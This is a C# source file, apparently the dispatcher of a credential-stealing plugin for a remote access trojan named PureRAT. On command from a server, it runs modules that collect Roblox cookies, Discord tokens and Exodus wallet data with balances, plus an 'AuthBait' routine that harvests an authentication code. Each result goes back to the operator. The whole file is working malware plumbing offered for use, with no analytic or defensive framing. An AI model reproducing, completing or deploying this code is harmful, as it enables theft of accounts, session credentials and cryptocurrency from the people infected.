// PureAIO.Client — entry point.
// Called by PureRAT's plugin loader: Initialize(byte[] packet).
// Dispatches each server request to its stealer on a thread-pool thread.

using System;
using System.IO;
using System.Threading;
using PluginSDK;
using ProtoBuf;
using PureAIO;
using PureAIO.Client.AuthBait;
using PureAIO.Client.Stealers;

namespace PureAIO.Client
{
    public class Core
    {
        public static void Initialize(byte[] packet)
        {
            var client = new PluginClient(packet);
            client.ReceivedMessageEvent += OnPacketReceived;
            client.Start();
        }

        private static void OnPacketReceived(PluginClient client, CustomPacket raw)
        {
            AIOPacket pkt;
            try
            {
                using var ms = new MemoryStream(raw.Buffer);
                pkt = Serializer.Deserialize<AIOPacket>(ms);
            }
            catch { return; }

            switch (pkt)
            {
                case AuthBaitStartRequest _:
                    ThreadPool.QueueUserWorkItem(_ =>
                    {
                        var (ok, code, err) = AuthBaitWorker.Run();
                        Send(client, new AuthBaitCodeResponse
                        {
                            Success = ok,
                            Code    = code,
                            Error   = err
                        });
                    });
                    break;

                case RobloxCookieRequest _:
                    ThreadPool.QueueUserWorkItem(_ =>
                    {
                        try
                        {
                            var list = RobloxCookieStealer.Collect();
                            Send(client, new RobloxCookieResponse
                            {
                                Success = true,
                                Cookies = list
                            });
                        }
                        catch (Exception ex)
                        {
                            Send(client, new RobloxCookieResponse
                            {
                                Success = false,
                                Error   = ex.Message
                            });
                        }
                    });
                    break;

                case DiscordTokenRequest _:
                    ThreadPool.QueueUserWorkItem(_ =>
                    {
                        try
                        {
                            var list = DiscordTokenStealer.Collect();
                            Send(client, new DiscordTokenResponse
                            {
                                Success = true,
                                Tokens  = list
                            });
                        }
                        catch (Exception ex)
                        {
                            Send(client, new DiscordTokenResponse
                            {
                                Success = false,
                                Error   = ex.Message
                            });
                        }
                    });
                    break;

                case ExodusRequest _:
                    ThreadPool.QueueUserWorkItem(_ =>
                    {
                        try
                        {
                            var (items, balances) = ExodusStealer.Collect();
                            Send(client, new ExodusResponse
                            {
                                Success  = true,
                                Items    = items,
                                Balances = balances
                            });
                        }
                        catch (Exception ex)
                        {
                            Send(client, new ExodusResponse
                            {
                                Success = false,
                                Error   = ex.Message
                            });
                        }
                    });
                    break;
            }
        }

        private static void Send(PluginClient client, AIOPacket pkt)
        {
            using var ms = new MemoryStream();
            Serializer.Serialize(ms, pkt);
            client.Send(new CustomPacket { Buffer = ms.ToArray() });
        }
    }
}
